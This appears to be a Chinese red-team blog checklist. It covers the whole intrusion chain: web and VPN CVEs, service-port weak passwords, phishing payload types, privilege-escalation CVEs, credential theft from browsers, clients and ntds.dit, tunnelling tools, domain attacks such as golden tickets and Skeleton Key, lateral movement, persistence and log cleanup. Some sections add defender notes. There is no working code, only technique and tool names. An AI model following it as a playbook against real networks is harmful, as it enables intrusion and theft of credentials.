<h4 id="各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的"><a href="#各种能快速getshell的常规基础Web漏洞利用-注-有些漏洞在不审代码的情况下其实是很难有效盲测到的" class="headerlink" title="各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]"></a>各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后台弱口令</span><br><span class="line">SSRF</span><br><span class="line">sql注入</span><br><span class="line">越权</span><br><span class="line">命令 / 代码执行 / 反序列化</span><br><span class="line">任意文件上传 / 下载 / 读取</span><br><span class="line">包含</span><br><span class="line">XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)</span><br><span class="line">业务逻辑漏洞</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="针对各类边界网络设备的各种利用-主要是Web管理控制台登录弱口令-及-各类已知nday攻击利用"><a href="#针对各类边界网络设备的各种利用-主要是Web管理控制台登录弱口令-及-各类已知nday攻击利用" class="headerlink" title="针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用"></a>针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用</h4><ul>
<li>Pulse Secure VPN<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2019-11510 [ 任意文件读取 ]</span><br></pre></td></tr></table></figure></li>
<li>Fortinet VPN<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2018-13379 [ 文件读取 ]</span><br></pre></td></tr></table></figure></li>
<li>Sangfor Vpn RCE</li>
</ul>
<h3 id="0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”"><a href="#0x03-入口权限获取-专门针对各类基础服务端口的各种getshell利用，防御重点-“重中之重”" class="headerlink" title="0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” ) ]"></a>0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( “重中之重” ) ]</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及 </span><br><span class="line">同样,已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序</span><br><span class="line">如下,就每个端口的具体攻击利用方式,进行了简要说明</span><br></pre></td></tr></table></figure>

<ul>
<li>Top Port List<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mssql 	  [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]</span><br><span class="line">SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">WinRM	  [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]</span><br><span class="line">SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]</span><br><span class="line">ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]</span><br><span class="line">Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]</span><br><span class="line">REDIS	  [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]</span><br><span class="line">POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]</span><br><span class="line">SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]</span><br><span class="line">POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover... pth脱邮件, 敏感信息泄露 ... ]</span><br><span class="line">VNC       [ 默认工作在tcp 5900端口, 弱口令 ]</span><br><span class="line">FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]</span><br><span class="line">Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]</span><br><span class="line">Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]</span><br><span class="line">TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]</span><br><span class="line">SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]</span><br><span class="line">JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]</span><br><span class="line">CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="0x04-入口权限获取"><a href="#0x04-入口权限获取" class="headerlink" title="0x04 入口权限获取"></a>0x04 入口权限获取</h3><h4 id="传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点"><a href="#传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点" class="headerlink" title="传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点"></a>传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点</h4><ul>
<li><p>发信前期准备</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">枚举有效的目标邮箱用户名列表</span><br><span class="line">批量探测目标邮箱弱口令</span><br><span class="line">伪造发信人 [ 发信邮服搭建 ]</span><br><span class="line">钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
</li>
<li><p>典型投递方式 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种,直接给目标发送各种常规木马信 </span><br><span class="line"></span><br><span class="line">传统宏利用</span><br><span class="line">捆绑</span><br><span class="line">exe[zip,7z]</span><br><span class="line">lnk</span><br><span class="line">chm</span><br><span class="line">自解压</span><br><span class="line">木马链接</span><br><span class="line">OLE</span><br><span class="line">CVE-2017-11882 [ 利用漏洞触发 ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 </span><br><span class="line"></span><br><span class="line">Vpn</span><br><span class="line">Mail</span><br><span class="line">OA</span><br><span class="line">Net ntlm hash [ 远程模板注入,pdf...钓hash,国内ISP过滤SMB流量不适用 ]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>


<h3 id="0x05-主机安全-提权利用，防御重点"><a href="#0x05-主机安全-提权利用，防御重点" class="headerlink" title="0x05 主机安全 [ 提权利用，防御重点 ]"></a>0x05 主机安全 [ 提权利用，防御重点 ]</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些&quot;边缘性&quot;的利用都暂未提及</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 系统漏洞 本地提权 [ 成功的前提是,保证事先已做好各种针对性免杀 ]<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BypassUAC [ win7 / 8  / 8.1 / 10 ]</span><br><span class="line">MS14-058[KB3000061]				    [重点]</span><br><span class="line">MS14-068[KB3011780]				    [重点]</span><br><span class="line">ms15-051[KB3045171]				    [重点]</span><br><span class="line">MS15-077[KB3077657]				    [重点]</span><br><span class="line">MS16-032[KB3124280]				    [重点]</span><br><span class="line">ms16-075					    [重点]</span><br><span class="line">MS16-135[KB3199135]				    [重点]</span><br><span class="line">MS17-010[KB4013389]				    [重点]</span><br><span class="line">cve-2019-0708					    [重点]</span><br><span class="line">CVE-2019-0803					    [重点]</span><br><span class="line">CVE-2019-1322 &amp; CVE-2019-1405			    [重点]</span><br><span class="line">cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]	    [重点]</span><br></pre></td></tr></table></figure></li>
<li>linux 内核漏洞 本地提权 [ linux-exploit-suggester ]<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CVE-2016-5195					    [重点]</span><br><span class="line">CVE-2017-16995</span><br><span class="line">CVE-2019-13272</span><br></pre></td></tr></table></figure></li>
<li>利用各类第三方服务 / 软件工具提权<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mssql 						    [重点]</span><br><span class="line">Oracle         					    [重点]</span><br><span class="line">Mysql</span><br><span class="line">各类第三方软件dll劫持 				    [重点]</span><br><span class="line">suid权限                        </span><br><span class="line">计划任务</span><br><span class="line">各种错误服务配置利用</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行"><a href="#0x06-内网安全-敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行" class="headerlink" title="0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]"></a>0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]</h3><ul>
<li>搜集当前已控”跳板机”的各类敏感信息<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述</span><br><span class="line"></span><br><span class="line">查看当前shell权限 及 详细系统内核版本</span><br><span class="line">获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip</span><br><span class="line">获取当前系统最近的用户登录记录</span><br><span class="line">获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置... ]</span><br><span class="line">获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息</span><br><span class="line">获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]</span><br><span class="line">获取本机 rdp / ssh 端口开启状态 及 其默认端口号</span><br><span class="line">获取本机所有用户的rdp外连记录</span><br><span class="line">获取本机的所有SSH登录记录</span><br><span class="line">获取当前系统所有登录成功的日志 [ 针对windows ]</span><br><span class="line">获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]</span><br><span class="line">获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录</span><br><span class="line">获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]</span><br><span class="line">获取当前用户 桌面 及 回收站 里的所有文件列表</span><br><span class="line">获取当前系统的所有存在suid权限的二进制程序</span><br><span class="line">获取当前系统代理 [ ip &amp; 端口 ]</span><br><span class="line">获取当前系统所有的自启动注册表项值</span><br><span class="line">获取当前系统的所有 ipc 连接 及 已启用共享</span><br><span class="line">获取当前系统的所有挂载[mount]</span><br><span class="line">获取当前系统的防火墙状态</span><br><span class="line">获取当前系统所有分区/盘符及其详细使用情况</span><br><span class="line">获取本机的累计开机时长</span><br><span class="line">获取本机arp / dns缓存</span><br><span class="line">获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby...等语言的执行环境,后期可设法利用 ]</span><br><span class="line">获取当前系统所有本地用户及组列表</span><br><span class="line">获取当前系统host文件内容</span><br><span class="line">获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]</span><br><span class="line">远程截屏捕捉目标用户敏感操作</span><br><span class="line"></span><br><span class="line">由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>利用当前已控 “跳板机”, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布 </p>
</li>
<li><p>批量抓取内网所有windows机器名 和 所在 “域” / “工作组名” [smb探测扫描]</p>
</li>
<li><p>针对内网的各种高危敏感服务定位[“安全” 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]</p>
</li>
<li><p>内网批量 Web Banner 抓取,获取关键目标业务系统如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内网各种文件[共享]服务器</span><br><span class="line">内网各类web服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网各类数据库服务器</span><br><span class="line">内网邮件服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网Vpn服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti...</span><br><span class="line">内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端...</span><br><span class="line">内网日志服务器</span><br><span class="line">内网补丁服务器</span><br><span class="line">内网各类OA,ERP,CRM,SRM,HR系统... </span><br><span class="line">内网打印服务器</span><br><span class="line">内网 MES 系统 </span><br><span class="line">内网虚拟化服务器 / 超融合平台 [Vmware ESX]</span><br><span class="line">内网堡垒机...</span><br><span class="line">内网运维,研发 部门员工的机器</span><br><span class="line">内网路由,交换设备...</span><br><span class="line">等等等...</span><br><span class="line"></span><br><span class="line">针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现</span><br><span class="line">通过在一些关键节点设备/服务器上部署探针搜集流量</span><br><span class="line">再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的</span><br></pre></td></tr></table></figure>
</li>
<li><p>针对各类已知系统高危RCE漏洞的批量探测识别与利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]</span><br><span class="line">MS17-010</span><br><span class="line">CVE-2019-0708</span><br><span class="line"></span><br><span class="line">其实针对此类漏洞的攻击利用识别,就显得比较直白了</span><br><span class="line">通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”"><a href="#0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”" class="headerlink" title="0x07 内网安全  [ 各类敏感凭证 “搜集” 与 “窃取” ]"></a>0x07 内网安全  [ 各类敏感凭证 “搜集” 与 “窃取” ]</h3><ul>
<li><p>主动密码搜集 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的</span><br><span class="line">此处不再赘述, 此项非防御重点, 因为压根也不好防</span><br><span class="line"></span><br><span class="line">批量抓取当前机器上的 &quot;各类基础服务配置文件中保存的各种账号密码&quot;</span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 &quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 &quot;数据库客户端工具中保存各种数据库连接账号密码</span><br><span class="line">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span><br><span class="line"></span><br><span class="line">抓取当前系统 &quot;注册表中保存的各类账号密码hash&quot; [ Windows ]</span><br><span class="line">抓取当前系统所有 &quot;本地用户的明文密码/hash&quot; [ Windows &amp; linux ]</span><br><span class="line">抓取当前系统的所有 &quot;用户token&quot; [ Windows ]</span><br><span class="line">抓取 &quot;windows凭据管理器中保存的各类连接账号密码&quot;</span><br><span class="line">抓取 &quot;MSTSC 客户端中保存的所有rdp连接账号密码&quot;</span><br><span class="line">抓取各类 &quot;VNC客户端工具中保存的连接密码&quot;</span><br><span class="line">抓取 &quot;GPP目录下保存的各类账号密码&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span><br><span class="line">抓取各类 &quot;SSH客户端工具中保存的各种linux系统连接账号密码&quot;, SecureCRT,Xshell,WinSCP,putty</span><br><span class="line">抓取各类 &quot;浏览器中保存的各种web登录密码&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span><br><span class="line">抓取各类 &quot;数据库表中保存的各类账号密码hash&quot;</span><br><span class="line">抓取各类 &quot;FTP客户端工具中保存的各种ftp登录账号密码&quot;, filezila, xftp...</span><br><span class="line">抓取各类 &quot;邮件客户端工具中保存的各种邮箱账号密码&quot;, forxmail, thunderbird...</span><br><span class="line">抓取各类 &quot;SVN客户端工具中保存的所有连接账号密码及项目地址&quot;</span><br><span class="line">抓取各类 &quot;VPN客户端工具中保存的各种vpn链接账号密码&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>被动密码搜集 [ 等着管理员自己来送密码 ] </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]</span><br><span class="line"></span><br><span class="line">Windows SSP [持久化/内存]</span><br><span class="line">Hook PasswordChangeNotify [持久化/内存]</span><br><span class="line">OWA 登录账号密码截获</span><br><span class="line">截获mstsc.exe中输入的rdp连接账号密码</span><br><span class="line">linux 别名记录利用</span><br><span class="line">本机明文密码嗅探 [ http,ftp,pop3... ]</span><br><span class="line">传统键盘记录</span><br><span class="line">windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>Hash爆破:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hashcat [ 完全拼GPU ]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x08-内网安全-内网常用-“隧道””-“转发””-“代理””-穿透手法-提炼汇总-，防御重点"><a href="#0x08-内网安全-内网常用-“隧道””-“转发””-“代理””-穿透手法-提炼汇总-，防御重点" class="headerlink" title="0x08 内网安全 [ 内网常用 “隧道”” / “转发”” / “代理”” 穿透手法 提炼汇总 ，防御重点 ]"></a>0x08 内网安全 [ 内网常用 “隧道”” / “转发”” / “代理”” 穿透手法 提炼汇总 ，防御重点 ]</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">出网流量刺探</span><br><span class="line">比如,http,dns,以及一些穿透性相对较好的tcp端口... </span><br><span class="line">这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器</span><br><span class="line"></span><br><span class="line">常规 HTTP脚本代理</span><br><span class="line">abptts,Neo-reGeorg,reGeorg,tunna,reduh...</span><br><span class="line">不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行</span><br><span class="line"></span><br><span class="line">SSH 隧道</span><br><span class="line">加密端口转发,socks 实战用途非常灵活,此处不细说 ]</span><br><span class="line"></span><br><span class="line">Rdp 隧道</span><br><span class="line"></span><br><span class="line">反向SOCKS</span><br><span class="line">nps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks ... </span><br><span class="line">工具基本都不免杀了,需要自行处理</span><br><span class="line"></span><br><span class="line">正反向TCP 端口转发</span><br><span class="line">非常多,就不一一列举, eg: nginx,netsh,socat,ew....</span><br><span class="line"></span><br><span class="line">DNS加密隧道			</span><br><span class="line"></span><br><span class="line">Web端口复用</span><br><span class="line"></span><br><span class="line">需要明白的是,在一般的红队场景中</span><br><span class="line">入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性</span><br></pre></td></tr></table></figure>

<h3 id="0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点"><a href="#0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点" class="headerlink" title="0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]"></a>0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]</h3><ul>
<li><p>针对当前域的一些常规信息搜集[ 其实现实中,只需要一个BloodHound &amp; Pingcastle足矣,就是工具需要自行事先免杀好]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取当前域内的完整域管列表</span><br><span class="line">获取当前域内的所有域控机器名列表</span><br><span class="line">获取当前域内的所有DNS服务器机器名列表</span><br><span class="line">获取当前域内的所有SPN</span><br><span class="line">获取当前域内的所有OU</span><br><span class="line">获取当前域内的所有用户 &amp; 用户组列表</span><br><span class="line">获取当前域信任关系 [ 跨域渗透 ]</span><br><span class="line">获取当前域内所有机器的开机时间</span><br><span class="line">获取当前域内网段及web站点</span><br><span class="line">获取当前域内策略 [ 主要是为了了解密码策略 ]</span><br><span class="line">获取当前域林</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
</li>
<li><p>快速获取目标域控权限的一些常规手法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ] </span><br><span class="line">服务票据hash破解(&quot;尤其是域管用户的&quot;) [ kerberoast ]</span><br><span class="line">批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</span><br><span class="line">Kerberos 委派利用</span><br><span class="line">爆破LDAP</span><br><span class="line">Exchange特定ACL滥用</span><br><span class="line">SSP 截获关键服务器登录密码</span><br><span class="line">利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞... ],在内网循环抓各类密码,直至</span><br><span class="line">  抓到域管密码</span><br><span class="line">  抓到域管令牌</span><br><span class="line">DNSAdmin 组成员滥用 [ 加载执行恶意dll ]</span><br><span class="line">LAPS</span><br><span class="line">MS14-068 [ 如今实际中已很少遇到了 ]</span><br><span class="line">LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>域内后渗透敏感信息搜集分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取所有DNS记录</span><br><span class="line">导出当前域的完整LDAP数据库</span><br><span class="line">提取当前域的ntds.dit [ 域内账号密码数据库 ]</span><br><span class="line">  Dcsync同步</span><br><span class="line">  Volume Shadow Copy Service</span><br></pre></td></tr></table></figure>
</li>
<li><p>域内指定用户登录ip定位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用OWA登录日志</span><br><span class="line">利用域控服务器登录日志</span><br><span class="line">指定服务银票 [ Silver Ticket ]</span><br><span class="line">除此之外,就是下面的各类常规横向手法</span><br></pre></td></tr></table></figure>
</li>
<li><p>域内指定用户机器定向控制技巧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绑定用户登录脚本</span><br><span class="line">利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]</span><br><span class="line">PTT [ 票据传递 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>针对域管的各种权限维持技巧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">金票</span><br><span class="line">Skeleton Key</span><br><span class="line">DSRM密码同步</span><br><span class="line">OWA后门</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>域内Exchange 邮件数据脱取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用Ews接口通过PTH的方式脱邮件</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”"><a href="#0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”" class="headerlink" title="0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]"></a>0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]</h3><ul>
<li><p>从 Windows平台 横向至  Windows平台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限</span><br><span class="line"></span><br><span class="line">远程服务管理 [ SCM ]</span><br><span class="line">远程创建执行计划任务 [ Scheduled Tasks ]</span><br><span class="line">WMI 远程执行 [ WMI ]</span><br><span class="line">针对高版本Windows 的WinRM 远程执行 </span><br><span class="line">DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]</span><br><span class="line">高版本 RDP 远程执行</span><br><span class="line">利用MSSQL数据库存储过程来变相远程执行</span><br><span class="line">利用Oracle数据库存储过程来变相远程执行</span><br><span class="line">SMB [ PTH (hash传递) ]</span><br><span class="line">RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]</span><br><span class="line">利用补丁服务器下发执行</span><br><span class="line">利用EDR主控端定向下发执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>从 Windows平台 横向至 *inux平台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plink 或者 基于Windows SSH库自行开发各种远程执行小工具</span><br></pre></td></tr></table></figure>
</li>
<li><p>从 *inux平台 横向至 Windows 平台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下</span><br><span class="line">wmiexec_linux_x86_64</span><br><span class="line">smbexec_linux_x86_64</span><br><span class="line">psexec_linux_x86_64</span><br><span class="line">atexec_linux_x86_64</span><br><span class="line">dcomexec_linux_x86_64</span><br><span class="line"></span><br><span class="line">另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>从 *inux平台 横向至 *inux 平台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>各种远程下载技巧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget [ win &amp; linux ]</span><br><span class="line">curl [ win &amp; linux ]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道</span><br><span class="line">某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可</span><br><span class="line"></span><br><span class="line">CertUtil.exe</span><br><span class="line">Bitsadmin.exe</span><br><span class="line">Regsvr32.exe</span><br><span class="line">Rundll32.exe</span><br><span class="line">Powershell.exe</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明"><a href="#0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明" class="headerlink" title="0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]"></a>0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]</h3><ul>
<li><p>边界入口权限维持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OWA 登录口 [ 账号密码,webshell ]</span><br><span class="line">VPN 登录口 [ 账号密码,shell ]</span><br><span class="line">其他 MAIL 登录口 [ 账号密码 ]</span><br><span class="line">边界 Web服务器 [ Webshell 驻留技巧 ]</span><br><span class="line">边界路由交换设备 [ 账号密码,shell ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows 单机系统维持 [临时]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统计划任务 [ 高权限/低权限 ]</span><br><span class="line">常规注册表自启动项 [ 用户权限/system权限 ]</span><br><span class="line">Mssql存储过程 [ 继承服务权限 ]</span><br><span class="line">WMI</span><br><span class="line">Winlogon</span><br><span class="line">CLR</span><br><span class="line">Logon Scripts</span><br><span class="line">MruPidlList</span><br><span class="line">Mof</span><br><span class="line">传统远控</span><br><span class="line">...</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>linux 单机系统维持 [临时]<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Patch SSH</span><br><span class="line">替换各类基础服务so [ PAM,Nginx,Rsync ...] </span><br><span class="line">系统计划任务</span><br><span class="line">传统应用层远控</span><br><span class="line">驱动层远控( 针对特定内核版本 )</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="0x12-痕迹处理"><a href="#0x12-痕迹处理" class="headerlink" title="0x12 痕迹处理"></a>0x12 痕迹处理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web日志 [ 访问, 错误日志 ]</span><br><span class="line">数据库日志 [ 异常连接日志,慢查询日志 ]</span><br><span class="line">系统各类安全日志 [ ssh,rdp,smb,wmi,powershell....]</span><br><span class="line">各类邮箱登录日志</span><br><span class="line">域内敏感攻击利用日志 [ 金票,银票... ]</span><br><span class="line">此项为专业蓝队范畴,不再赘述</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

